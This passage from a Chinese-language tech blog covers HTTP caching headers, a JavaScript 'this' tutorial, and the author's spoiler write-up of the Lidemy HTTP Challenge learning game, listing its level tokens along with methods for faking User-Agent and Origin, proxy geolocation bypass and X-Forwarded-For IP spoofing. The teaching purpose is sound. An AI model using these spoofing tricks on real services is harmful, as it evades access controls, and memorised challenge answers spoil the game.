max-age=0，這就代表說這個 Response 0 秒之後就會過期，意思是瀏覽器一接收到，就會標示為過期。這樣當使用者再次造訪頁面，就會去 Server 詢問有沒有新的資料，再搭配上Etag來使用，就可以保證只會下載到最新的 Response。 例如說第一個 Response 可能是這樣： 12Cache-Control: max-age=0Etag: 1234 我重新整理一次，瀏覽器發出這樣的 Request： 1If-None-Match: 1234 如果檔案沒有變動，Server 就會回傳：304 Modified，有變動的話就會回傳新的檔案並且更新Etag。如果是使用這種方式，其實就是「每一次造訪頁面都會發送一個 Request 去確認有沒有新的檔案，有的話就下載更新，沒有的話沿用快取裡的」。 除了上面這招max-age=0，其實有一個已經規範好的策略叫做：Cache-Control: no-cache。no-cache並不是「完全不使用快取的意思」，而是跟我們上面的行為一樣。每次都會發送 Request 去確認是否有新的檔案。 （註：其實這兩種還是有很細微的差別，可參考What’s the difference between Cache-Control: max-age=0 and no-cache?） 如果要「完全不使用快取」，是Cache-Control: no-store。這邊不要搞混了。 為了怕大家搞混，我再講一次這兩個的差異： 假設 A 網站是使用Cache-Control: no-store，B 網站是使用Cache-Control: no-cache。 當每一次重新造訪同樣一個頁面的時候，無論 A 網站有沒有更新，A 網站都會傳來「整份新的檔案」，假設index.html有 100 kb 好了，造訪了十次，累積的流量就是 1000kb。 B 網站的話，我們假設前九次網站都沒有更新，一直到第十次才更新。所以前九次 Server 只會回傳 Status code 304，這個封包大小我們姑且算作 1kb 好了。第十次因為有新的檔案，會是 100kb。那十次加起來的流量就是 9 + 100 = 109 kb 可以發現 A 跟 B 達成的效果一樣，那就是「只要網站更新，使用者就能立即看到結果」，但是 B 的流量遠低於 A，因為有善用快取策略。只要每一次 Request 都先確認網站有沒有更新即可，不用每一次都抓完整的檔案下來。 這就是no-store跟no-cache的差異，永遠不用快取跟永遠檢查快取。 最後一個問題 現在 Web App 當道，許多網站都是採用 SPA 的架構搭配 Webpack 打包。前端只需要引入一個 JavaScript 的檔案，Render 就交給 JavaScript 來做就好。 這類型的網站，HTML 可能長得像這樣： 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;link rel='stylesheet' href='style.css'&gt;&lt;/link&gt; &lt;script src='script.js'&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- body 為空，所有內容都交給 js 去 render --&gt;&lt;/body&gt;&lt;/html&gt; 當 JavaScript 載入之後，利用 JavaScript 把頁面渲染出來。 面對這種情境，我們就會希望這個檔案能夠跟上面的首頁檔案一樣，「只要檔案更新，使用者能夠立即看到新的結果」，因此我們可以用Cache-Control: no-cache來達成這個目標。 可是呢，還記得剛說過no-cache其實就是每一次訪問頁面，都去 Server 問說有沒有新的結果。意思就是無論如何，都會發出 Request。 有沒有可能，連 Request 都不發呢？ 意思就是：「只要檔案不更新，瀏覽器就不會發 Request，直接沿用快取裡的即可。只要檔案一更新，瀏覽器就要立即抓取新的檔案」 前者其實就是我們一開始講的max-age在做的事，但max-age沒辦法做到判斷「檔案不更新」這件事情。 所以其實這個目標，沒辦法單靠上面我們介紹的這些瀏覽器的快取機制來達成，需要 Server 那邊一起配合才行。其實說穿了，就是把 Etag 的機制自己實作在檔案裡面。 什麼意思呢？我們直接來看一個範例，我們把index.html改成這樣： 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;link rel='stylesheet' href='style.css'&gt;&lt;/link&gt; &lt;script src='script-qd3j2orjoa.js'&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- body 為空，所有內容都交給 js 去 render --&gt;&lt;/body&gt;&lt;/html&gt; 注意到 JavaScript 的檔名變成：script-qd3j2orjoa.js，後面其實就跟 Etag 一樣，都是代表這個檔案的 hash 值。然後我們把這個檔案的快取策略設成：Cache-Control: max-age=31536000。 這樣子這個檔案就會被快取住一年。一年之內都不會對這個 URL 發送新的 Request。 那如果我們要更新的話怎麼辦呢？我們不要更新這個檔案，直接更新index.html，換一個 JavaScript 檔案： 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;link rel='stylesheet' href='style.css'&gt;&lt;/link&gt; &lt;script src='script-8953jief32.js'&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- body 為空，所有內容都交給 js 去 render --&gt;&lt;/body&gt;&lt;/html&gt; 因為index.html的快取策略是no-cache，所以每一次訪問這個頁面，都會去看index.html是否更新。 以現在這個例子來說，它的確更新了，因此新的這份就會傳回給瀏覽器。而瀏覽器發現有新的 JavaScript 檔案就會去下載並且快取起來。 藉由把 Etag 的機制實作在index.html裡面，我們就達成了我們的目標：「只要檔案不更新，瀏覽器就不會發 Request，直接沿用快取裡的即可。只要檔案一更新，瀏覽器就要立即抓取新的檔案」 原理就是針對不同的檔案採用不同的快取策略，並且直接用「更換 JavaScript 檔案」的方式強制瀏覽器重新下載。 這邊也可以參考 Google 提供的圖片： （來源：https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-tw） 總結 之所以快取的機制會有點小複雜，是因為分成不同的部分，每一個相關的 Header 其實都是在負責不同的部分。例如說Expires跟max-age是在負責看這個快取是不是「新鮮」，Last-Modified, If-Modified-Since, Etag, If-None-Match是負責詢問這個快取能不能「繼續使用」，而no-cache與no-store則是代表到底要不要使用快取，以及應該如何使用。 這篇文章其實只講到快取機制的一半，沒有提到的部分大致上都跟 shared cache 以及 proxy server 有關，有其他的值是在決定快取能不能被存在 proxy server 上？或者是驗證能否繼續使用的時候應該要跟原 server 驗證，還是跟 proxy server 驗證也可以。有興趣想要知道更多的讀者們可以參考底下的參考資料。 最後，希望這篇文章能讓初學者更理解 HTTP 的快取機制。 參考資料 彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法 浅谈浏览器http的缓存机制 使用 HTTP 缓存：Etag, Last-Modified 与 Cache-Control 【Web缓存机制系列】1 – Web缓存的作用与类型 HTTP缓存控制小结 MDN - Cache-Control rfc2616 Google Web Fundamentals HTTP 1.0 spec","link":"/2017/08/27/http-cache/"},{"title":"幕後花絮：Lidemy HTTP Challenge 的設計以及彩蛋","text":"前言 前陣子我為了幫自己的學生們更熟悉 HTTP 以及 API 的串接，寫出了一個小遊戲：Lidemy HTTP Challenge，需要根據每一關的說明取得正確的 token，一共有十五關，前十關基本，後五關進階。 經過了一些朋友的測試之後，慢慢調整、改善，最後讓學生測試發現反應都不錯，於是就在前端社群正式對外公開這個遊戲，讓大家也能一起參與。 如果你還沒玩過，那強烈建議你不要看這篇文章，因為這篇文章會破壞你遊玩的興致（大概就跟電影爆雷一樣）。建議可以先去玩一下，等全破了再回來看這篇文章，會得到一些不同的收穫。 接下來我會講一下這個遊戲誕生的歷程以及每個關卡的設計。 前人種樹，後人乘涼 這種以遊戲當做外殼，內容卻是滿滿技術的手法大家應該並不陌生，至少我很不陌生。 最一開始有想要做成遊戲的這個想法，其實是因為一個學生傳給我這個：devtest，這是法國某一間公司的面試考題，如果你看到畫面一片白，那絕對不是網頁壞掉，不用擔心。 破完了上面這個遊戲之後，我才想起自己對這種模式其實很不陌生。小時候玩過高手過招，也玩過類似 Hack This Site! 的遊戲。 或是以前有一陣子解謎遊戲正夯（跟程式無關的那種），我也曾經自己做了一個，那時候是用 PIXNET 文章鎖密碼的方式來做關卡，現在想想真是個非常方便的方法。 總之呢，雖然小時候都玩過，但長大之後卻慢慢忘記還有這種模式。這種模式的好處就在於它是遊戲。遊戲做得好，每個人都會愛上它。而且會比一般的你問我答或是簡答題有趣多了，所以遊戲是個很好的切入點。 想起遊戲的好處以後，我就決定要自己來做一個了，而主題就是之前我的學生們最不熟悉的串接 Web API！ 最初的構想 最一開始的想法是： 我希望這是一個你用 curl 也可以玩的遊戲 因為我覺得這樣很 cool，你用 terminal 搭配指令就可以玩這個遊戲，甚至連瀏覽器都不需要開！ 因此，在畫面的呈現上從最初我就打算是純文字的，沒有任何連結或是花花綠綠的東西，它就是個純文字檔！如果有連結也不會有 &lt;a&gt;，就只會是個 URL 而已。 形式的話，就是比照其他遊戲用闖關的。 大致上都定好之後，就是要來決定關卡的內容要有哪些。在一開始我原本想做二十關，後來列一列想要出現的題目，發現大概只能做個六七關左右。 原本的構想如下： CURD 一定要有，要讓學生會串 API 的這四種基本操作 custom header 一定要有 origin 相關的題目一定要有 user agent 相關的題目一定要有 後三個一定要有是因為我覺得這在理解 HTTP 跟串 API 上面也很重要。 custom header 常常會來帶一些額外資訊，或是最常做的就是驗證。origin 的話想讓學生理解 same origin policy 只跟瀏覽器有關，脫離了瀏覽器就完全沒有這個限制。user agent 則是工作上滿實用的，會需要判斷使用者的瀏覽器或是偵測是不是搜尋引擎來做相對應的處理。 要出現的東西大致上有想法了，最後就是實際的內容跟 token 的設計。遊戲的內容如果只有：「請你 POST 一筆資料去 XXX」太無聊了，所以我把場景設定在玩家是一個去圖書館幫忙的新手，要幫助老爺爺解決一些圖書資訊系統的問題。 至於書籍資料我就很快去某網站爬了一下然後稍微做處理，資料的部分就這樣很快搞定了。 有了故事之後，還想要藏幾個彩蛋在裡面。與其說是彩蛋，不如說是一些我覺得比較有趣的小東西，看看有沒有人會發現。因此在關卡的內容跟 token 上面其實都有藏一些東西。 我記得最初的版本我大概花了兩天就做完了。一天想關卡另外一天寫 code，想關卡的部分花比較久，因為程式碼實做的部分滿簡單的。 接著就讓我們先來看看前十關每一關的內容吧！ 再次強調，如果你還沒破完，強烈建議不要觀看！趕快先去玩：Lidemy HTTP Challenge。 第一關 1234567啊...好久沒有看到年輕人到我這個圖書館了，我叫做 lib，是這個圖書館的管理員很開心看到有年輕人願意來幫忙，最近圖書館剛換了資訊系統，我都搞不清楚怎麼用了... 這是他們提供給我的文件，我一個字都看不懂，但對你可能會有幫助先把這文件放一旁吧，這個待會才會用到你叫做什麼名字呢？用 GET 方法跟我說你的 name 叫做什麼吧！除了 token 以外順便把 name 一起帶上來就可以了 第一關只是想讓大家先拿到 API 文件，然後熟悉一下有些關卡會需要直接把資訊帶在網址上，因此第一關就只是讓大家熟悉環境而已。 傳入 name 以後，就可以拿到第二關的 token。 其實這邊剛開始的時候有不少人卡住，因為題目說明不清楚，所以有些人會以為是不是要去 call API 之類的。後來我就改了一下題目說明，盡可能講清楚，之後也新增了提示的功能。 第二關 123我前陣子在整理書籍的時候看到了一本我很喜歡的書，可是現在卻怎麼想都想不起來是哪一本...我只記得那本書的 id 是兩位數，介於 54~58 之間，你可以幫幫我嗎？找到是哪一本之後把書的 id 用 GET 傳給我就行了。 這關的 id 範圍是 54~58，其實原本就是想讓大家一個一個試，沒有其他方法。 這邊藏的小彩蛋是 id 56 的書籍就是 5566 的書： 1&#123;&quot;id&quot;:56,&quot;name&quot;:&quot;5566－認真&quot;,&quot;author&quot;:&quot;鄭佩芬&quot;,&quot;ISBN&quot;:&quot;0614361311&quot;&#125; 所以下一關的 token 才會是 5566NO1 第三關 1234567真是太感謝你幫我找到這本書了！ 剛剛在你找書的時候有一批新的書籍送來了，是這次圖書館根據讀者的推薦買的新書，其中有一本我特別喜歡，想要優先上架。書名是《大腦喜歡這樣學》，ISBN 為 9789863594475。 就拜託你了。新增完之後幫我把書籍的 id 用 GET 告訴我。 這關就只是在測驗會不會用 POST 而已。 有一個小地方是原本 API 文件沒有寫清楚要怎樣 POST，content type 是 form 還是 JSON？所以後來把這塊補上去了，避免產生歧義。 第四關 123我翻了一下你之前幫我找的那本書，發現我記錯了...這不是我朝思暮想的那一本。我之前跟你講的線索好像都是錯的，我記到別本書去了，真是抱歉啊。我記得我想找的那本書，書名有：「世界」兩字，而且是村上春樹寫的，可以幫我找到書的 id 並傳給我嗎？ 這關測驗會不會使用 API 的參數來查詢書籍，但要作弊直接在 local 搜尋其實也可以。 我自己滿愛村上春樹，而我有個朋友酷愛《世界末日與冷酷異境》這本書，所以就把它放進來了。為了讓搜尋「世界」的時候不要只出現一個結果，我還去找了其他幾本也有這個關鍵字的書放進去。 而下一關的 token HarukiMurakami 就是村上春樹的名字。 第五關 123昨天有個人匆匆忙忙跑過來說他不小心捐錯書了，想要來問可不可以把書拿回去。跟他溝通過後，我就把他捐過來的書還他了，所以現在要把這本書從系統裡面刪掉才行。那本書的 id 是 23，你可以幫我刪掉嗎？ 這關考 DELETE 的使用而已，沒什麼難度。 這邊藏的小彩蛋是他捐錯的書是雞排妹寫真集，所以想趕快拿回去。這也對應到了下一關的 token：CHICKENCUTLET。 第六關 1234567我終於知道上次哪裡怪怪的了！照理來說要進入系統應該要先登入才對，怎麼沒有登入就可以新增刪除...這太奇怪了，我已經回報給那邊的工程師了，他們給了我一份新的文件：這邊是帳號密碼，你先登入試試看吧，可以呼叫一個 /me 的 endpoint，裡面會給你一個 email。把 email 放在 query string 上面帶過來，我看看是不是對的。帳號：admin密碼：admin123 對新手來說其實算是比較有挑戰性的一關。 這關考的是知不知道怎麼樣在 header 裡面放內容，以及根據資料去找出怎麼用 http basic authorization。主要是想讓大家知道 HTTP 的其中一種驗證方式。 第七關 12345那邊的工程師說系統整個修復完成了，剛好昨天我們發現有一本書被偷走了...這本書我們已經買第五次了，每次都被偷走，看來這本書很熱門啊。我們要把這本書從系統裡面刪掉，就拜託你了。對了！記得要用新的系統喔，舊的已經完全廢棄不用了。書的 id 是 89。 其實只是沒梗了所以又加一個刪除資料的關卡，這邊的一個小插曲是原本沒有「對了！記得要用新的系統喔，舊的已經完全廢棄不用了。」這句，導致有些人還是用舊版 API，因此才加上去，避免大家搞混。 這本很熱門的書你實際上去看的話，會發現是《跟著月亮走：韓國瑜的夜襲精神與奮進人生》，對應到了下一關的 token：HsifnAerok，倒過來就變 KoreanFish。 第八關 12345我昨天在整理書籍的時候發現有一本書的 ISBN 編號跟系統內的對不上，仔細看了一下發現我當時輸入系統時 key 錯了。哎呀，人老了就是這樣，老是會看錯。 那本書的名字裡面有個「我」，作者的名字是四個字，key 錯的 ISBN 最後一碼為 7，只要把最後一碼改成 3 就行了。對了！記得要用新的系統喔，舊的已經完全廢棄不用了。 這關就考找資料跟修改資料而已，沒什麼特別的。 下一關也就是第九關的 token 是NeuN，德文中的九。 第九關 12345678API 文件裡面有個獲取系統資訊的 endpoint 你記得嗎？工程師跟我說這個網址不太一樣，用一般的方法是沒辦法成功拿到回傳值的。 想要存取的話要符合兩個條件：1. 帶上一個 X-Library-Number 的 header，我們圖書館的編號是 202. 伺服器會用 user agent 檢查是否是從 IE6 送出的 Request，不是的話會擋掉 順利拿到系統資訊之後應該會有個叫做 version 的欄位，把裡面的值放在 query string 給我吧。 這關考兩個東西： 會不會傳 custom header 知不知道怎麼改 user agent，以及是否知道 user agent 代表的意義 這兩個就是前面有說過我一定要放進來的元素，因為我覺得很重要。 我想讓學生們知道說 user agent 其實有滿多作用，其中一個就包含讓 server 知道你的瀏覽器跟作業系統之類的；也想讓他們知道這些東西都可以偽造。 原本其實是設定 Server 會檢查是不是從 Safari 送出的 Request，但用 mac 的人就可以開 Safari 過關，因此後來才改成用 IE6。如果你要去裝 IE6 的 VM 那我也就算了XD 下一關的 token 是duZDsG3tvoA，其實是 YouTube 的影片 ID，對應到的是周杰倫的半島鐵盒。因為我滿喜歡這首歌，而且這首歌跟書也有點關係。 第十關 12345678時間過得真快啊，今天是你在這邊幫忙的最後一天了。 我們來玩個遊戲吧？你有玩過猜數字嗎？ 出題者會出一個四位數不重複的數字，例如說 9487。你如果猜 9876，我會跟你說 1A2B，1A 代表 9 位置對數字也對，2B 代表 8 跟 7 你猜對了但位置錯了。 開始吧，把你要猜的數字放在 query string 用 num 當作 key 傳給我。 原本是想讓大家真的來玩猜數字，預計猜個五六次就可以破關。但判斷邏輯我沒寫好，所以你傳一個數字或是重複數字我都沒擋掉，或者是你要直接暴力嘗試 9999 種組合也沒人攔你，所以這題的解法就很多種。 到這邊為止，就是前十關的內容。 第一次優化 做完前十關之後讓一些朋友先試玩，得到的反應都還不錯，但也發現一些問題，其中有些我上面已經提過了，例如說： 第一關說明不清楚，不知道 name 要傳到哪裡 沒有提示要用新版 API，以為可以用舊的 如果瀏覽器那關限制 Safari，對 Mac 使用者毫無難度 上述問題基本上都可以透過加強文字敘述來改善，但還發現一個更大的問題： 卡關 雖然說卡關是人之常情，但其實我不希望大家一直卡關。畢竟這個遊戲的最終目的其實是學習，好玩對我來說只是附加價值。可是我又不能破壞遊戲體驗，直接講解答，因此我必須提供一個方法讓他們可以看到提示。 你可能會問我那提示幹嘛不用白色文字就好，還要加 &amp;hint=1 這麼麻煩。你可能忘了，我開頭有說初衷是想讓 curl 也可以玩這個遊戲，所以白色文字是沒有用的。 總之呢，最後加上了提示的功能，讓遊戲變得更完整了，體驗也變得更好。 原本遊戲就到這邊結束了，但剛好我又有了一些靈感，所以繼續往下做了一些關卡，下面來講講進階關卡。 第十一關 1234嘿！很開心看到你願意回來繼續幫忙，這次我們接到一個新的任務，要跟在菲律賓的一個中文圖書館資訊系統做串連這邊是他們的 API 文件，你之後一定會用到。 現在就讓我們先跟他們打個招呼吧，只是我記得他們的 API 好像會限制一些東西就是了... 這關是開頭所提到的，一定要做的 origin 相關關卡。會放在進階關是因為怕對我學生來說有些太難，所以才放這裡。 總之是想讓大家理解就算 Server 檢查 origin，Client 也可以輕易偽造。然後這跟瀏覽器的 CORS 一點關係都沒有，大家要很清楚 Request 從瀏覽器發出來以及自己發 Request 是兩件很不一樣的事，前者會有許多限制，後者沒有。 下一關的 tokenr3d1r3c7其實是 leet 的redirect，已經暗示了下一關的解法。 第十二關 1234打完招呼之後我們要開始送一些書過去了，不過其實運送沒有你想像中的簡單，不是單純的 A 到 B 而已而是像轉機那樣，A 到 C，C 才到 B，中間會經過一些轉運點才會到達目的地...算了，我跟你說那麼多幹嘛 現在請你幫我把運送要用的 token 給拿回來吧，要有這個 token 我們才能繼續往下一步走 這一關也是後期我很想放的一關，覺得這樣的概念滿有趣的。透過在 redirect 過程的途中塞東西，強迫大家去理解 server side redirect 的原理是什麼（301 跟 302 status code）。 若是你不懂為什麼可以轉址以及轉址背後的原理，你就解不開這題。 下一關的 token 為qspyz，往左平移一個字元之後變成proxy，一樣暗示著下一關的解法。 第十三關 1234太好了！自從你上次把運送用的 token 拿回來以後，我們就密切地與菲律賓在交換書籍可是最近碰到了一些小問題，不知道為什麼有時候會傳送失敗我跟他們反映過後，他們叫我們自己去拿 log 來看，你可以幫我去看看嗎？從系統日誌裡面應該可以找到一些端倪。 這關是在考 proxy 的使用，因為 Server 會檢查使用者的 IP 是否來自於菲律賓。 檢查的方法是用 node-geoip： 123456789advancedRouter.get('/logs', (req, res) =&gt; &#123; const ip = req.ip || '' const info = geoip.lookup(ip) || &#123;&#125; if (info.country === 'PH') &#123; res.end(text.lv13.reply) &#125; else &#123; res.end(text.lv13.wa) &#125;&#125;) 所以只要隨便找一個在菲律賓的 proxy 來送 request 就可以過關了。 不過這關有兩件出乎意料的事，第一件事是滿多人都會嘗試偽造Accept-Language這個 header，這我當初完全沒想到（不過也沒用就是了）。 第二件事是這題還有另一個解答，就是偽造X-Forwarded-For，這也是我當初完全沒想到的事。 我在 Express 裡面有開app.set('trust proxy', true)，所以在拿使用者 IP 的時候如果有X-Forwarded-For這個 header，會以這邊的資訊為準。 剛好前陣子讀到一篇類似的文章：利用X-Forwarded-For伪造客户端IP漏洞成因及防范。 雖然不是我預設的解法，但我覺得這個解法更有趣，所以就沒有特地修掉了。 第十四關 12345678跟那邊的溝通差不多都搞定了，真是太謝謝你了，關於這方面沒什麼問題了！不過我老大昨天給了我一個任務，他希望我去研究那邊的首頁內容到底是怎麼做的為什麼用 Google 一搜尋關鍵字就可以排在第一頁，真是太不合理了 他們的網站明明就什麼都沒有，怎麼會排在那麼前面？難道說他們偷偷動了一些手腳？讓 Google 搜尋引擎看到的內容跟我們看到的不一樣？ 算了，還是不要瞎猜好了，你幫我們研究一下吧！ 這關想讓大家知道的事情是不只瀏覽器，各家爬蟲也會帶特定的 User-Agent，所以 Server 一樣可以針對不同的 UA 來輸出不同的資訊（雖然不被推薦就是了）。 舉例來說，一個 SPA 可以只針對 Google 搜尋引擎跟 Facebook 啟用 Server side render 來輸出內容，對一般用戶還是 Client side render。 或是像 HTTP Challenge 這個網站，本身就有針對不同的 UA 做處理（因為網站都是純文字，但我希望在臉書上被分享時有自訂標題跟敘述）： 123456789// base on UA return differect resultrouter.get('/start', (req, res) =&gt; &#123; const UA = req.header('User-Agent') || '' if (UA.indexOf('facebookexternalhit') &gt;= 0 || UA.indexOf('Googlebot') &gt;= 0 )&#123; res.end(text.seo) &#125; else &#123; res.end(text.start.intro) &#125;&#125;) 不過好像弄得怪怪的，不知道有沒有成功就是了。 這就是最後一關囉，第十五關是結語。 第二次優化 做完進階關卡之後，敘述的部分其實也有改一點，例如說第十四關就有學生以為跟 Chrome 有關（想到 Google 就只想到 Chrome XD），所以我特地強調說「Google 搜尋引擎」，要往這方向找才是正確的。 而其中最讓我驚訝的還是第十三關那個我沒有想到的解法X-Forwarded-For。 在對外公開之後，一個朋友跟我說最後應該放一個 gist 讓大家留言。我內心一驚：對欸，可以放 gist。 因為我原本就有想說要不要放個排行榜或者是留言板之類的，讓破完的人可以留個言當作紀念，可是要做這功能挺麻煩的，我懶得做。被朋友提醒才突然發現 gist 本來就有內建留言功能，那就直接放一個 gist 就好了！ 所以前期破關的朋友是沒有 gist 可以留言的，是到後面才新增的。 總結 這次很開心可以把這些知識包裝成游戲跟大家分享，迴響似乎也挺不錯的。雖然有些人期待會再加新關卡，但我目前完全沒靈感就是了。 之後比較有可能的是做個 HTML、CSS 跟 JavaScript 的版本，類型差不多，但就是每關的解法跟知識點不一樣，到時候再來跟大家分享。 感謝早期幫我測試的朋友們，也感謝跟我一起享受遊戲的大家。底下是一些相關的闖關心得，有興趣的話也可以看看： 一日圖書館管理員：HTTP Challenge HTTP_Game攻略(一) Lidemy HTTP 圖書館小弟加班(V2) 小挑戰 http game 解題思路心得想法","link":"/2019/05/18/lidemy-http-challenge/"},{"title":"淺談 JavaScript 頭號難題 this：絕對不完整，但保證好懂","text":"前言 在 JavaScript 裡面，有一個令新手十分頭痛，老手也不一定能完全理解的主題：「this 是什麼？」。身為一個以 JavaScript 當作吃飯工具的前端工程師，我也被這個問題困擾了許久。 我原本以為我這輩子都不會寫有關於 this 的文章。 原因有兩個，第一個是講解 this 的文章已經超級無敵多了，而且每一篇都寫得很不錯，之前看完 What’s THIS in JavaScript ? 系列之後覺得講解的很完整，若是沒有把握自己能夠講得更清楚或是以不同的角度切入，似乎就沒必要再寫一篇文章；第二個原因是若是想要「完全」搞懂 this，要付出的成本可能比你想像中要大得多。 這裡所說的「完全」指的是無論在任何情況下，你都有辦法講出為什麼 this 的值是這樣，直接給大家一個範例： 12345678910111213141516171819var value = 1; var foo = &#123; value: 2, bar: function () &#123; return this.value; &#125;&#125; //範例1console.log(foo.bar());//範例2console.log((foo.bar)());//範例3console.log((foo.bar = foo.bar)());//範例4console.log((false || foo.bar)());//範例5console.log((foo.bar, foo.bar)()); 你能答的出來嗎？如果不行的話，代表你沒有「完全」懂 this。要完全懂 this 之所以要付出的成本很大，就是因為「完全懂 this」指的就是「熟記 ECAMScript 規範」。this 的值是什麼不是我們憑空想像的，其實背後都有完整的定義，而那個定義就是所謂的 ECMAScript 規範，你必須先搞懂這個規範，才有可能完全理解 this 在每個情況下所指涉的對象。 若是你真的很想完全搞懂，推薦你這一篇：JavaScript深入之从ECMAScript规范解读this，我上面的範例就是從這一篇拿來的，想看解答、想理解為什麼的話可以去看這一篇。 既然我前面提了這麼多讓我不寫 this 的理由，怎麼最後我還是跳下來寫了？ 因為，在我看了這麼多的文章，吸取了一大堆日月精華並且思考過後，發現如果有個不錯的切入點，或許就可以讓 this 變得不是這麼難懂。以我這篇教的方法，不會讓你把 this 完全搞懂，上面那五個範例你可能會答錯，但基本的題目你依舊可以解的出來。 這也是標題的由來：「絕對不完整，但保證好懂」，此文的目的是希望提供一個不同的角度來看 this，從為什麼會有 this 下手，再用一套規則來解釋 this 的值，至少讓你不再對 this 有誤解，也會知道一些常見的情境底下 this 到底是什麼。 要談 this，要從物件導向開始談 （若是你對 JavaScript 的物件導向完全沒概念，你可以先補完相關基礎，並且看完這篇：該來理解 JavaScript 的原型鍊了） 如果你有寫過其他程式語言，你就知道 this 從來都不是一件什麼困難的事。它代表的就是在物件導向裡面，那個 instance 本身。 我舉個例子： 12345678910111213class Car &#123; setName(name) &#123; this.name = name &#125; getName() &#123; return this.name &#125;&#125; const myCar = new Car()myCar.setName('hello')console.log(myCar.getName()) // hello 在上面我們宣告了一個 class Car，寫了 setName 跟 getName 兩個方法，在裡面用this.name來存取這個 instance 的屬性。 為什麼要這樣寫？因為這是唯一的方法，不然你要把 name 這個屬性存在哪裡？沒有其他地方讓你存了。所以 this 的作用在這裡是顯而易見的，所指到的對象就是那個 instance 本身。 以上面的範例來說，myCar.setName('hello')，所以 this 就會是myCar。在物件導向的世界裡面，this 的作用就是這麼單純。 或者換句話說，我認為： 一但脫離了物件導向，其實 this 就沒有什麼太大的意義 假設今天 this 只能在 class 裡面使用，那應該就不會有任何問題對吧？你有看過其他程式語言像是寫 Java 或是 C++ 的人在抱怨說 this 很難懂嗎？沒有，因為 this 的作用很單純。 那問題是什麼？問題就是在 JavaScript 裡面，你在任何地方都可以存取到 this。所以在 JavaScript 裡的 this 跟其他程式語言慣用的那個 this 有了差異，這就是為什麼 this 難懂的原因。 儘管 this 的定義不太一樣，但我認為本質上還是很類似的。要理解 this 的第一步就是告訴自己：「一但脫離了物件，就不太需要關注 this 的值，因為沒什麼意義」 沒什麼太大意義的 this 12345function hello()&#123; console.log(this)&#125; hello() this 的值會是什麼？ 延續我們前面所講的，在這種情況下我會跟你說 this 沒有任何意義，而且你千萬不要想成 this 會指到hello這個 function，沒有這種事。 只要記得我前面跟你說的：「脫離了物件，this 的值就沒什麼意義」。 在這種很沒意義的情況下，this 的值在瀏覽器底下就會是window，在 node.js 底下會是global，如果是在嚴格模式，this 的值就會是undefined。 這個規則應該滿好記的，幫大家重新整理一下： 嚴格模式底下就都是undefined 非嚴格模式，瀏覽器底下是window 非嚴格模式，node.js 底下是global 這個就是你在其他文章看到的「預設綁定」，但我在這篇不打算用任何專有名詞去談 this。我認為不用這些名詞也不會妨礙你的理解，甚至還有可能讓你更好理解。我也不是說專有名詞不重要，是說可以先把概念學起來，再回過頭來補專有名詞。 一但脫離了物件，this 的值就沒什麼意義，在沒意義的情況底下就會有個預設值，而預設值也很好記，嚴格模式就是undefined，非嚴格模式底下就是全域物件。 更改 this 的值 僅管 this 可能有預設的值，但我們可以透過一些方法來改它。這改的方法也很簡單，一共有三種。 前兩種超級類似，叫做call跟apply，這兩種都是能夠呼叫 fucntion 的函式，我舉一個例子給你看比較好懂： 12345678'use strict';function hello(a, b)&#123; console.log(this, a, b)&#125; hello(1, 2) // undefined 1 2hello.call(undefined, 1, 2) // undefined 1 2hello.apply(undefined, [1, 2]) // undefined 1 2 我們有一個叫做 hello 的函式，會 log 出 this 的值以及兩個參數。在我們呼叫hello(1, 2)的時候，因為是嚴格模式所以 this 是 undefined，而 a 跟 b 就是 1 跟 2。 當我們呼叫hello.call(undefined, 1, 2)的時候，我們先忽略第一個參數不談，你可以發現他其實跟hello(1, 2)是一樣的。 而 apply 的差別只在於他要傳進去的參數是一個 array，所以上面這三種呼叫 function 的方式是等價的，一模一樣。除了直接呼叫 function 以外，你也可以用 call 或是 apply 去呼叫，差別在於傳參數的方式不同。 call 跟 apply 的差別就是這麼簡單，一個跟平常呼叫 function 一樣，一個用 array 包起來。 那我們剛剛忽略的第一個參數到底是什麼呢？ 你可能已經猜到了，就是this的值！ 1234567'use strict';function hello(a, b)&#123; console.log(this, a, b)&#125; hello.call('yo', 1, 2) // yo 1 2hello.apply('hihihi', [1, 2]) // hihihi 1 2 就是如此簡單，你第一個參數傳什麼，裡面 this 的值就會是什麼。儘管原本已經有 this，也依然會被這種方法給覆蓋掉： 123456789class Car &#123; hello() &#123; console.log(this) &#125;&#125; const myCar = new Car()myCar.hello() // myCar instancemyCar.hello.call('yaaaa') // yaaaa 原本 this 的值應該要是 myCar 這個 instance，可是卻被我們在使用 call 時傳進去的參數給覆蓋掉了。 除了以上兩種以外，還有最後一種可以改變 this 的方法：bind。 1234567'use strict';function hello() &#123; console.log(this)&#125; const myHello = hello.bind('my')myHello() // my bind 會回傳一個新的 function，在這邊我們把 hello 這個 function 用 my 來綁定，所以最後呼叫 myHello() 時會輸出 my。 以上就是三種可以改變 this 的值的方法。你可能會好奇如果我們把 call 跟 bind 同時用會怎樣： 1234567'use strict';function hello() &#123; console.log(this)&#125; const myHello = hello.bind('my')myHello.call('call') // my 答案是不會改變，一但 bind 了以後值就不會改變了。 這邊還要特別提醒的一點是在非嚴格模式底下，無論是用 call、apply 還是 bind，你傳進去的如果是 primitive 都會被轉成 object，舉例來說： 1234567function hello() &#123; console.log(this)&#125; hello.call(123) // [Number: 123]const myHello = hello.bind('my')myHello() // [String: 'my'] 幫大家做個中場總結： 在物件以外的 this 基本上沒有任何意義，硬要輸出的話會給個預設值 可以用 call、apply 與 bind 改變 this 的值 物件中的 this 最前面我們示範了在物件導向 class 裡面的 this，但在 JavaScript 裡面還有另外一種方式也是物件： 12345678const obj = &#123; value: 1, hello: function() &#123; console.log(this.value) &#125;&#125; obj.hello() // 1 這種跟一開始的物件導向範例不太一樣，這個範例是直接創造了一個物件而沒有透過 class，所以你也不會看到 new 這個關鍵字的存在。 再繼續往下講之前，要大家先記住一件事情： this 的值跟作用域跟程式碼的位置在哪裡完全無關，只跟「你如何呼叫」有關 這個機制恰巧跟作用域相反，不確定我在說什麼的可以先看這篇：所有的函式都是閉包：談 JS 中的作用域與 Closure。 